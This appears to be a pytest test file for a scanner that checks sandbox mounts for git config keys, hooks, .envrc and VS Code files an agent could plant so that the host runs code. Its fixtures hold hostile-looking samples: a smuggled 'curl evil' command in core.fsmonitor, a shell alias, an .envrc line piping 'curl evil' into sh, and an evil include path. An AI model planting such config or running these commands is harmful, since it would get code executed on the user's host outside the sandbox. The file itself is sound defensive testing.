"""Host-side detection of planted host-executed config (PLAN §1)."""

import os
import time
from types import SimpleNamespace

import pytest
from agentbox import hostscan as hs

CFG = r"""
[core]
	repositoryformatversion = 0
	FSMonitor = "/tmp/x; curl evil" ; comment
	bare
[Core "Sub"]
	pager = ignored-subsection
[alias]
	st = status
	pwn = "!sh -c 'id'"
[filter "lfs"]
	clean = git-lfs clean -- %f
[diff "pdf"]
	textconv = pdftotext
[credential "https://x"]
	helper = store
[include]
	path = ../evil.inc
[includeIf "gitdir:~/w/"]
	path = x.inc
[branch "main"]
	remote = origin
	merge = refs/heads/main
[core.legacy]
	editor = no
[remote "origin"] url = https://a\
b.example/r # tail
"""


def names(text):
    return dict(hs.parse_git_config(text))


def test_parser_sections_subsections_quotes_case():
    d = names(CFG)
    assert d["core.fsmonitor"] == "/tmp/x; curl evil"
    assert d["core.bare"] == "true"
    assert d["core.Sub.pager"] == "ignored-subsection"  # subsection case kept
    assert d["alias.pwn"] == "!sh -c 'id'"
    assert d["filter.lfs.clean"].startswith("git-lfs")
    assert d["includeif.gitdir:~/w/.path"] == "x.inc"
    assert d["core.legacy.editor"] == "no"  # legacy [a.b] form: subsection
    assert d["remote.origin.url"] == "https://ab.example/r"  # continuation, comment
    assert hs.parse_git_config("garbage [[[\n= x\n[ok]\nk=v\x00") == [("ok.k", "v\x00")]


def test_risky_keys():
    risky = {k for k, v in hs.parse_git_config(CFG) if hs.risky_key(k, v)}
    assert risky == {
        "core.fsmonitor", "alias.pwn", "filter.lfs.clean", "diff.pdf.textconv",
        "credential.https://x.helper", "include.path", "includeif.gitdir:~/w/.path",
    }  # fmt: skip
    for k in ("core.hookspath", "core.sshcommand", "core.pager", "core.editor"):
        assert hs.risky_key(k, "x")
    assert not hs.risky_key("alias.st", "status")
    assert not hs.risky_key("branch.main.remote", "origin")
    assert not hs.risky_key("core.Sub.pager", "x")


def repo(tmp_path):
    r = tmp_path / "m"
    (r / ".git" / "hooks").mkdir(parents=True)
    (r / ".git" / "hooks" / "pre-commit.sample").write_text("x")
    (r / ".git" / "config").write_text("[core]\n\tbare = false\n")
    return r


def prof(*mounts):
    ms = [SimpleNamespace(mode=mode, host_real=str(p)) for p, mode in mounts]
    return SimpleNamespace(mounts=ms)


def test_each_risk_kind_detected(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    assert not before["incomplete"]
    with (r / ".git" / "config").open("a") as f:
        f.write('[core]\n\tfsmonitor = "' + "A" * 100 + '"\n[branch "x"]\n\tremote = o\n')
    (r / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nevil\n")
    (r / ".git" / "commondir").write_text("../evil\n")
    (r / ".envrc").write_text("curl evil | sh\n")
    (r / ".vscode").mkdir()
    (r / ".vscode" / "tasks.json").write_text("{}")
    ch = hs.diff(before, hs.snapshot(p))
    text = "\n".join(ch)
    assert len(ch) == 5, ch
    assert "[core.fsmonitor]: added:" in text and "A" * 60 + "…" in text and "A" * 61 not in text
    for part in (".git/hooks/post-checkout", ".git/commondir", ".envrc", ".vscode/tasks.json"):
        assert part in text
    assert "branch" not in text
    msg = hs.report(ch, False)
    assert "WARNING" in msg and "cat .git/config" in msg and "ls -la .git/hooks" in msg


def test_benign_changes_not_reported(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    with (r / ".git" / "config").open("a") as f:
        f.write('[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n')
    (r / ".git" / "hooks" / "new.sample").write_text("x")
    (r / "file.txt").write_text("work")
    assert hs.diff(before, hs.snapshot(p)) == []
    assert hs.report([], False) is None


def test_ro_mounts_ignored(tmp_path):
    r = repo(tmp_path)
    before = hs.snapshot(prof((r, "ro")))
    (r / ".envrc").write_text("x")
    assert before["items"] == {} and hs.diff(before, hs.snapshot(prof((r, "ro")))) == []


def test_symlinks_never_followed(tmp_path):
    r = repo(tmp_path)
    secret = tmp_path / "outside"
    secret.write_text("[core]\n\tfsmonitor = x\n")
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    (r / ".envrc").symlink_to(secret)
    (r / ".git" / "hooks" / "pre-push").symlink_to(secret)
    (r / ".git" / "config").unlink()
    (r / ".git" / "config").symlink_to(secret)
    after = hs.snapshot(p)
    text = "\n".join(hs.diff(before, after))
    assert ".envrc: added: symlink" in text
    assert ".git/hooks/pre-push: added: symlink" in text
    assert ".git/config: added: symlink" in text
    assert "fsmonitor" not in text  # the target was not parsed


def test_git_file_and_symlinked_git(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    os.rename(r / ".git", tmp_path / "moved")
    (r / ".git").write_text("gitdir: /elsewhere\n")
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert ".git: changed: dir -> file sha256:" in text
    (r / ".git").unlink()
    (r / ".git").symlink_to(tmp_path / "moved")
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert ".git: changed: dir -> symlink" in text


def test_subdir_repos_and_enclosing(tmp_path):
    outer = tmp_path / "outer"
    (outer / ".git").mkdir(parents=True)
    mount = outer / "mnt"
    sub = mount / "proj"
    (sub / ".git" / "hooks").mkdir(parents=True)
    p = prof((mount, "rw"))
    before = hs.snapshot(p)
    assert any("enclosing repo" in k for k in before["items"])
    (sub / ".git" / "hooks" / "pre-commit").write_text("x")
    assert any("proj/.git/hooks/pre-commit" in c for c in hs.diff(before, hs.snapshot(p)))


def test_big_file_capped(tmp_path):
    r = repo(tmp_path)
    (r / ".envrc").write_bytes(b"a" * (hs.READ_MAX + 10))
    items = hs.snapshot(prof((r, "rw")))["items"]
    assert f"(first {hs.READ_MAX} of {hs.READ_MAX + 10} bytes)" in items[f"{r}: .envrc"]


def test_hook_cap_and_budget(tmp_path, monkeypatch):
    r = repo(tmp_path)
    for i in range(hs.MAX_HOOKS + 5):
        (r / ".git" / "hooks" / f"h{i:03d}").write_text("x")
    s = hs.snapshot(prof((r, "rw")))
    assert s["incomplete"] and sum("/hooks/h" in k for k in s["items"]) == hs.MAX_HOOKS
    assert "scan incomplete" in hs.report([], True)
    s = hs.snapshot(prof((r, "rw")), budget=-1)
    assert s["incomplete"]
    t0 = time.monotonic()
    hs.snapshot(prof((r, "rw")))
    assert time.monotonic() - t0 < 2


def test_control_chars_cleaned(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    with (r / ".git" / "config").open("a") as f:
        f.write('[alias]\n\tx = "!\\u001b]0;PWN\x07 sh"\n')
    (r / ".git" / "hooks" / "a\x1bb").write_text("x")
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert "\x1b" not in text and "\x07" not in text and "\\x1b" in text


def test_save_mode_and_load(tmp_path):
    f = tmp_path / "s" / "snap.json"
    hs.save(f, {"items": {"a": "b"}, "incomplete": False})
    assert f.stat().st_mode & 0o777 == 0o600
    assert hs.load(f)["items"] == {"a": "b"} and hs.load(tmp_path / "none") is None


@pytest.mark.parametrize(
    "key",
    ["core.askpass", "core.gitproxy", "sequence.editor", "gpg.program", "gpg.ssh.program",
     "diff.external", "pager.log", "merge.ours.driver", "difftool.x.cmd", "mergetool.x.cmd",
     "remote.origin.uploadpack", "remote.origin.receivepack"],
)  # fmt: skip
def test_more_host_exec_keys(key):
    assert hs.risky_key(key, "x")


@pytest.mark.parametrize("key", ["remote.origin.url", "merge.ff", "diff.renames", "gpg.format"])
def test_benign_neighbours(key):
    assert not hs.risky_key(key, "x")


def test_bom_first_section_detected(tmp_path):
    """git honours a UTF-8 BOM; a BOM-glued first section must not hide keys."""
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    (r / ".git" / "config").write_bytes(
        b"\xef\xbb\xbf[alias]\n\tst = !touch /tmp/x\n[core]\n\tbare = false\n"
    )
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert "[alias.st]: added:" in text


def test_unparsed_line_change_reported_benign_not(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    with (r / ".git" / "config").open("a") as f:
        f.write("[core\n\tfsmonitor = x\n")  # malformed header git may read differently
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert "(unparsed lines)" in text
    assert hs.parse_git_config_ex('[branch "feat/x"]\n\tremote = o\n')[1] == []


def test_non_utf8_config_reported(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    (r / ".git" / "config").write_bytes(b"[core]\n\tbare = false\n\t# \xff\xfe\n")
    assert "(not UTF-8)" in "\n".join(hs.diff(before, hs.snapshot(p)))


def test_vscode_settings_and_launch_watched(tmp_path):
    r = repo(tmp_path)
    p = prof((r, "rw"))
    before = hs.snapshot(p)
    (r / ".vscode").mkdir()
    (r / ".vscode" / "settings.json").write_text("{}")
    (r / ".vscode" / "launch.json").write_text("{}")
    text = "\n".join(hs.diff(before, hs.snapshot(p)))
    assert ".vscode/settings.json" in text and ".vscode/launch.json" in text
